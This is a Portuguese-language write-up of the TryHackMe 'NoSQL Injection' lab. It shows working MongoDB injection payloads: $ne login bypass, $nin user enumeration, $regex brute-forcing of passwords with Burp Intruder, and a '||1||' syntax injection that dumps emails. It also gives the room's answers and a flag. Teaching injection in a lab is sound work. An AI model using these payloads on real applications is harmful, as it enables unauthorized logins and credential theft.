---
title: NoSQL - Injection
date: 2025-03-06 21:50:00
categories: [TRYHACKME, ROOMS]
tags: [web,sql,injection,database]      # TAG names should always be lowercase
image: 
 path: /assets/img/posts/2025/03/nosql-injection/room_image.webp
---

## NoSQL

As informações não são armazenadas em `tabelas`mas sim em `documentos`.
Exemplo de banco de dados em **NoSQL**: MongoDB.

### MongoDB

Em um banco de dados NoSQL os valores são salvos em pares: `chave-valor`, por exemplo, um banco de dados do departamento de RH.

`{"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }`

Esses são os `documentos`, armazenado em uma matriz associativa com um número arbitrário de campos.
Esses `documentos`são estruturados em uma hierarquia superior, chamada de `coleções`, essas por sua vez são equivalentes as `tabelas` que temos em um banco de dados relacional.

![Collections](/assets/img/posts/2025/03/nosql-injection/nosql-collections.png)

As `coleçoes`são agrupadas em um banco de dados.

![Databases](/assets/img/posts/2025/03/nosql-injection/nosql-database.png)

### Consultando banco de dados

A consulta é realizada em `chave-valor` nos documentos, por exemplo.

![key-value](/assets/img/posts/2025/03/nosql-injection/nosql-pairs.png

Pesquisando somente por `last_name`:
`['last_name' => 'Sandler']`

Realizando duas condição (`and`):
`['gender' => 'male', 'last_name' => 'Phillips']`

Pesquisando menor que:
`['age' => ['$lt'=>'50']]`

Mais operadores: `https://www.mongodb.com/pt-br/docs/manual/reference/operator/query/`


**What is a group of documents in MongoDB is known as?**  
R:`collection`

**Using the MongoDB Operator Reference, what operator is used to filter data when a field isn't equal to a given value?**  
R:`$ne`

**Following the example of the 3 documents given before, how many documents would be returned by the following filter: `['gender' => ['$ne' => 'female'] , 'age' => ['$gt'=>'65'] ]`?**  
R: `0`

## NoSQL injection

Assim como no **SQL injection** o NoSQL injection podemos encerrar a consulta atual e manipular, para realizarmos outra, além disso, também temos o **operator injection**, nesse caso injetamos um NoSQL para alterar o comportamento da consulta, sendo assim temos dois tipos:

- NoSQL injection
- Operator Injection

### Exemplo

Neste exemplo iremos explorar o ataque de `operator injection`.

```php
<?php
$con = new MongoDB\Driver\Manager("mongodb://localhost:27017");


if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
        $user = $_POST['user'];
        $pass = $_POST['pass'];

        $q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
        $record = $con->executeQuery('myapp.login', $q );
        $record = iterator_to_array($record);

        if(sizeof($record)>0){
                $usr = $record[0];

                session_start();
                $_SESSION['loggedin'] = true;
                $_SESSION['uid'] = $usr->username;

                header('Location: /sekr3tPl4ce.php');
                die();
        }
}
header('Location: /?err=1');
?>
```

A consulta feita no banco de dados:

`['username'=>$user, 'password'=>$pass]`

Podemos manipular da seguinte maneira:

`['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]`

Neste caso, qualquer usuário e senha, diferente de `xxxx`e `yyyy`já é valido, podemos autenticar na aplicação utilizando o primeiro `documento` que é retornado na consulta.

**What type of NoSQL Injection is similar to normal SQL Injection?**  
R: `Syntax`

**What type of NoSQL Injection allows you to modify the behaviour of the query, even if you can't escape the syntax?**  
R: `Operator`

## Bypassing the Login Screen

![Bypassing](/assets/img/posts/2025/03/nosql-injection/nosql-bypassing.png)

Alteramos nossa requisição no Burp Suite, inserindo `[$ne]`.

![HTTP-headers](/assets/img/posts/2025/03/nosql-injection/nosql-headers-http.png)

Com isso realizamos o bypass da autenticação.

![Bypassed](/assets/img/posts/2025/03/nosql-injection/nosql-bypassed.png)

**When bypassing the login screen using the $ne operator, what is the email of the user that you are logged in as?**  
R: `admin@nosql.int`

## Operator Injection: Logging in as Other Users

No ataque anterior somos limitado com qual usuário podemos acessar, o acesso é feito com o primeiro resultado que a pesquisa retorna. Podemos também acessar com outro usuário, com o operador `$nin` conseguimos alterar o usuário que acessamos, a definição do operador.

- `$nin`: Não corresponde a nenhum dos valores especificados em uma array.

Já sabemos um usuário que existe `admin`, agora podemos especificar ele no operador `$nin`, assim iremos acessar com outro usuário.

	user[$nin][]=admin&pass[$ne]=adsdasdas&remember=on

A consulta como ficaria.

	['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]

![Pedro](/assets/img/posts/2025/03/nosql-injection/nosql-pedro.png)


Assim utilizamos a mesma logica, para ir para o terceiro usuário que o banco retorna, dessa forma podemos enumerar todos os usuários do banco de dados.

**How many users are there in total?**

Precisamos realizar a pesquisa até atingir a tela de usuário inválido `/?err=1`.
Payload utilizado:

```
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&user[$nin][]=secret&pass[$ne]=adsdasdas&remember=on
```

A consulta:

```
['username'=>['$nin'=>['admin','pedro','john','secret'] ], 'password'=>['$ne'=>'aweasdf']]
```
R:`4`

**There is a user that starts with the letter "p". What is his username?**  
R:`pedro`

## Operator Injection: Extracting Users' Passwords

Temos acesso a todas as contas, porém não sabemos as senhas, é importante saber a senha pois dessa forma podemos comprometer outros serviços.

Vamos utilizar o operador `$regex`, sua definção:

`Seleciona documentos onde os valores correspondem a uma expressão regular especificada.`

Podemos advinha o **comprimento** da senha e depois advinha quais caracteres a senha possui.

Descobrindo o **comprimento** da senha:

- `[$regex]=^.{7}$`: estamos perguntando se o parâmetro `pass` possui comprimento de 7.

![Regex](/assets/img/posts/2025/03/nosql-injection/nosql-regex.png)

Através da página de `/?err=1` sabemos que a condição não é verdadeira, sendo assim o comprimento pode ser maior ou menor.
O **comprimento** é de 8.

![regex2](/assets/img/posts/2025/03/nosql-injection/nosql-regex2.png)

Sabendo o **comprimento**, agora iremos descobrir a senha, testando cada caractere (a-Z, 0-9) e também os especiais, o usuário `john`possui apenas números na senha, conforme a dica na pergunta.


    Question Hint  
    The password consists of numbers only.

Com `^0.......$`vamos iniciar o teste, de 0-9 , depois de descobrir vamos passar para o segundo caractere `^00......$`, até descobrirmos os 8 números da senha.

![Brute](/assets/img/posts/2025/03/nosql-injection/nosql-brute.png)

Assim vamos descobrindo cada número da senha.

![Brute2](/assets/img/posts/2025/03/nosql-injection/nosql-brute2.png)

Senha descoberta.

![password](/assets/img/posts/2025/03/nosql-injection/nosql-password.png)

**What is john's password?**  
R:`10584312`

**One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!**  

{: .prompt-tip }
	Question Hint
	
	The user is the same as the answer for question 2 of task 5.

Payload para descobrir o comprimento:

`user=pedro&pass[$regex]=^.{11}$&remember=on`

Lista com todas as letras do alfabeto.

```shell
crunch 1 1 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz >> numbers.txt
```

![crunch](/assets/img/posts/2025/03/nosql-injection/nosql-crunch.png)

Payload de teste no `intruder`: `user=pedro&pass[$regex]=^§a§..........$&remember=on`

Encontramos a senha, após testar todos os 11 caracteres.

![password regex](/assets/img/posts/2025/03/nosql-injection/nosql-regex-password.png)

```shell
root@ip-10-10-4-224:~# ssh pedro@10.10.201.31
pedro@10.10.201.31's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jun 23 03:34:24 2021 from 192.168.100.250
pedro@nosql-nolife:~$ cat flag.txt 
flag{N0Sql_n01iF3!}
pedro@nosql-nolife:~$ 
```

## Syntax Injection: Identification and Data Extraction

A aplicação retorna o e-mail de qualquer usuário.

![Syntax](/assets/img/posts/2025/03/nosql-injection/nosql-sintax.png)

Podemos testar se aplicação é vulnerável a injeção com um `'`.

![Application](/assets/img/posts/2025/03/nosql-injection/nosql-application.png)

Com a mensagem acima sabemos que a aplicação não realiza as devidas verificações, olhando o código da aplicação, a string passada é concatenada na consulta.

`for x in mycol.find({"$where": "this.username == '" + username + "'"}):`

Sendo assim, podemos realizar uma condição verdadeira e verificar o retorno.

```shell
root@ip-10-10-4-224:~# ssh syntax@10.10.201.31
syntax@10.10.201.31's password: 
Please provide the username to receive their email:'||1||'
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
Syntax@Injection.FTW
Connection to 10.10.201.31 closed.
root@ip-10-10-4-224:~# 
```

É retornado todos os e-mails da aplicação, dessa forma, realizamos o dump de todos os e-mail.

**What common character is used to test for injection in both SQL and NoSQL solutions?**  
R:`'`

**What is the email value of the super secret user returned in the last entry?**  
R:`Syntax@Injection.FTW`

## Conclusão

Na aula é apresentado diversas formas de NoSQL injection, de uma forma teórica e prática, apresentando a exploração de operadores e sintaxe.